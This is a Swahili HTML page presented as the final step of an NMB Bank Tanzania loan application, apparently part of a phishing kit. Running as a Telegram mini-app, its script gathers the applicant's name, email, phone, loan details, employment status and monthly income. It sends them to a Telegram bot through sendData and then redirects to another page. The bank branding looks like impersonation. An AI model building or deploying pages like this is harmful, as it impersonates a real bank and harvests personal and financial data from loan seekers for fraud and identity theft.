<!DOCTYPE html>
<html lang="sw">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>NMB Bank - Muhtasari wa Maombi</title>

    <!-- ✅ Telegram SDK -->
    <script src="https://telegram.org/js/telegram-web-app.js"></script>

    <style>
        :root {
            --nmb-blue: #0047ab;
            --nmb-hover: #003380;
            --bg-color: #f0f4f8;
            --card-bg: #ffffff;
            --text-main: #0f172a;
            --text-muted: #64748b;
            --input-border: #cbd5e1;
            --btn-gray: #e2e8f0;
            --btn-gray-text: #475569;
        }

        * {
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
        }

        body {
            background-color: var(--bg-color);
            margin: 0;
            padding: 0;
            display: flex;
            flex-direction: column;
            align-items: center;
            min-height: 100vh;
        }

        .app-header {
            width: 100%;
            background-color: var(--nmb-blue);
            height: 60px;
            padding: 0 20px;
            display: flex;
            align-items: center;
            justify-content: space-between;
            position: sticky;
            top: 0;
            z-index: 100;
        }

        .back-btn-top {
            color: white;
            text-decoration: none;
            font-weight: 600;
            font-size: 15px;
            cursor: pointer;
            display: flex;
            align-items: center;
            gap: 5px;
        }

        .header-title {
            position: absolute;
            left: 50%;
            transform: translateX(-50%);
            display: flex;
            font-size: 20px;
            font-weight: 800;
            color: white;
        }

        .header-title .nmb { color: white; margin-right: 4px; }
        .header-title .bank { color: #93c5fd; }

        .menu-icon {
            font-size: 24px;
            cursor: pointer;
            color: white;
            display: flex;
            flex-direction: column;
            gap: 5px;
        }

        .menu-icon span {
            display: block;
            width: 22px;
            height: 3px;
            background-color: white;
            border-radius: 2px;
        }

        .card {
            background: white;
            width: 90%;
            max-width: 440px;
            margin: 20px 0 30px;
            padding: 32px 24px;
            border-radius: 16px;
            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.05);
            display: flex;
            flex-direction: column;
        }

        .main-title {
            font-size: 26px;
            color: var(--text-main);
            margin: 0 0 6px;
            text-align: center;
            font-weight: 800;
            letter-spacing: -0.3px;
        }

        .subtext {
            font-size: 14px;
            color: var(--text-muted);
            text-align: center;
            margin-bottom: 20px;
        }

        .step-indicator {
            display: flex;
            justify-content: space-center;
            gap: 12px;
            margin: 0 auto 32px;
            width: 80%;
        }

        .step-bar {
            flex: 1;
            height: 4px;
            background-color: #e2e8f0;
            border-radius: 2px;
        }

        .step-bar.active {
            background-color: var(--nmb-blue);
        }

        .form-group {
            margin-bottom: 22px;
            display: flex;
            flex-direction: column;
        }

        .form-group label {
            font-size: 15px;
            font-weight: 700;
            color: #1e293b;
            margin-bottom: 10px;
        }

        .form-control {
            font-size: 15px;
            padding: 14px 16px;
            border: 1px solid var(--input-border);
            border-radius: 10px;
            background-color: #ffffff;
            color: #334155;
            outline: none;
            width: 100%;
        }

        .form-control:focus {
            border-color: var(--nmb-blue);
        }

        select.form-control {
            appearance: none;
            background-image: url("data:image/svg+xml;charset=UTF-8,%3csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='none' stroke='%23334155' stroke-width='2' stroke-linecap='round' stroke-linejoin='round'%3e%3cpolyline points='6 9 12 15 18 9'%3e%3c/polyline%3e%3c/svg%3e");
            background-repeat: no-repeat;
            background-position: right 16px center;
            background-size: 14px;
            padding-right: 40px;
            cursor: pointer;
        }

        .summary-card {
            background-color: #f8fafc;
            border-left: 4px solid var(--nmb-blue);
            padding: 18px 16px;
            border-radius: 10px;
            margin: 10px 0 24px;
            border: 1px solid #e2e8f0;
        }

        .summary-card h3 {
            margin: 0 0 14px 0;
            font-size: 16px;
            font-weight: 800;
            color: var(--text-main);
        }

        .summary-row {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 10px;
            padding-bottom: 8px;
            border-bottom: 1px solid #e2e8f0;
        }

        .summary-row:last-child {
            border-bottom: none;
            margin-bottom: 0;
            padding-bottom: 0;
        }

        .summary-label {
            color: #64748b;
            font-size: 13.5px;
            font-weight: 500;
        }

        .summary-value {
            font-weight: 700;
            font-size: 13.5px;
            color: #0f172a;
            text-align: right;
        }

        .btn-container {
            display: flex;
            flex-direction: column;
            gap: 12px;
            margin-top: 10px;
        }

        .btn-prev {
            background-color: var(--btn-gray);
            color: var(--btn-gray-text);
            border: none;
            width: 100%;
            padding: 16px;
            border-radius: 10px;
            font-size: 15px;
            font-weight: 700;
            cursor: pointer;
            text-transform: uppercase;
        }

        .btn-next {
            background-color: var(--nmb-blue);
            color: white;
            border: none;
            width: 100%;
            padding: 16px;
            border-radius: 10px;
            font-size: 15px;
            font-weight: 800;
            cursor: pointer;
            text-transform: uppercase;
        }

        .btn-next:hover {
            background-color: var(--nmb-hover);
        }

        .footer-banner {
            width: 100%;
            text-align: center;
            padding: 20px;
            font-size: 12px;
            color: #64748b;
            margin-top: auto;
        }
    </style>
</head>

<body>

<div class="app-header">
    <a onclick="goBack()" class="back-btn-top">← Rudi</a>
    <div class="header-title">
        <span class="nmb">NMB</span><span class="bank">Bank</span>
    </div>
    <div class="menu-icon">
        <span></span>
        <span></span>
        <span></span>
    </div>
</div>

<div class="card">
    <h1 class="main-title">Maombi ya Mkopo</h1>
    <div class="subtext">Hatua ya 3 kati ya 3</div>

    <div class="step-indicator">
        <div class="step-bar active"></div>
        <div class="step-bar active"></div>
        <div class="step-bar active"></div>
    </div>

    <form id="step3Form" onsubmit="submitForm(event)">
        <div class="form-group">
            <label for="jobStatus">Hali ya Ajira / Kazi</label>
            <select id="jobStatus" class="form-control" required>
                <option value="Mwajiriwa" selected>Mwajiriwa</option>
                <option value="Mfanyabiashara / Mjasiriamali">Mfanyabiashara / Mjasiriamali</option>
                <option value="Mwanafunzi">Mwanafunzi</option>
                <option value="Hana Ajira">Hana Ajira</option>
                <option value="Mstaafu">Mstaafu</option>
            </select>
        </div>

        <div class="form-group">
            <label for="income">Wastani wa Mapato ya Kila Mwezi (TZS)</label>
            <input type="number" id="income" class="form-control" placeholder="Mf: 800000" required>
        </div>

        <div class="summary-card">
            <h3>Muhtasari wa Maombi</h3>

            <div class="summary-row">
                <span class="summary-label">Kiasi cha Mkopo:</span>
                <span class="summary-value" id="sumAmount">--</span>
            </div>

            <div class="summary-row">
                <span class="summary-label">Muda wa Mkopo:</span>
                <span class="summary-value" id="sumDuration">--</span>
            </div>

            <div class="summary-row">
                <span class="summary-label">Sababu ya Mkopo:</span>
                <span class="summary-value" id="sumPurpose">--</span>
            </div>

            <div class="summary-row">
                <span class="summary-label">Mwombaji:</span>
                <span class="summary-value" id="sumName">--</span>
            </div>

            <div class="summary-row">
                <span class="summary-label">Simu:</span>
                <span class="summary-value" id="sumPhone">--</span>
            </div>
        </div>

        <div class="btn-container">
            <button type="button" class="btn-prev" onclick="goBack()">NYUMA</button>
            <button type="submit" class="btn-next">WASILISHA MAOMBI</button>
        </div>
    </form>
</div>

<div class="footer-banner">
    © 2026 NMB Bank Tanzania PLC
</div>

<script>
window.onload = () => {
    const tg = window.Telegram?.WebApp;
    if (tg) {
        tg.ready();   
        tg.expand();
    }

    const amount = localStorage.getItem('appliedAmount') || localStorage.getItem('amount');
    const term = localStorage.getItem('appliedTerm') || localStorage.getItem('loanDuration');
    const purpose = localStorage.getItem('appliedPurpose') || localStorage.getItem('loanPurpose');
    const fName = localStorage.getItem('firstName') || "";
    const lName = localStorage.getItem('lastName') || "";
    const phone = localStorage.getItem('phone') || "";

    if (amount) {
        const numAmount = Number(amount.replace(/\D/g, ''));
        document.getElementById('sumAmount').innerText = numAmount 
            ? `${numAmount.toLocaleString('en-US')} TZS` 
            : `${amount} TZS`;
    } else {
        document.getElementById('sumAmount').innerText = "--";
    }

    document.getElementById('sumDuration').innerText = term ? term : "--";
    document.getElementById('sumPurpose').innerText = purpose ? purpose : "--";
    document.getElementById('sumName').innerText = `${fName} ${lName}`.trim() || "--";
    document.getElementById('sumPhone').innerText = phone ? `+255 ${phone}` : "--";
};

function submitForm(event) {
    event.preventDefault();
    const tg = window.Telegram?.WebApp;
    const incomeVal = document.getElementById('income').value.trim();

    if (!incomeVal) {
        alert("Tafadhali jaza wastani wako wa mapato ya kila mwezi.");
        return;
    }

    const data = {
        amount: localStorage.getItem('appliedAmount') || localStorage.getItem('amount'),
        duration: localStorage.getItem('appliedTerm') || localStorage.getItem('loanDuration'),
        purpose: localStorage.getItem('appliedPurpose') || localStorage.getItem('loanPurpose'),
        firstName: localStorage.getItem('firstName'),
        lastName: localStorage.getItem('lastName'),
        email: localStorage.getItem('email'),
        phone: localStorage.getItem('phone'),
        jobStatus: document.getElementById('jobStatus').value,
        income: incomeVal,
        currency: "TZS"
    };

    localStorage.setItem('jobStatus', data.jobStatus);
    localStorage.setItem('income', incomeVal);

    if (tg && tg.sendData) {
        tg.sendData(JSON.stringify(data));
        setTimeout(() => {
            window.location.href = "/page5";
        }, 300);
    } else {
        console.log("Submitted payload:", data);
        window.location.href = "/page5";
    }
}

function goBack() {
    window.location.href = "/page3";
}
</script>

</body>
</html>
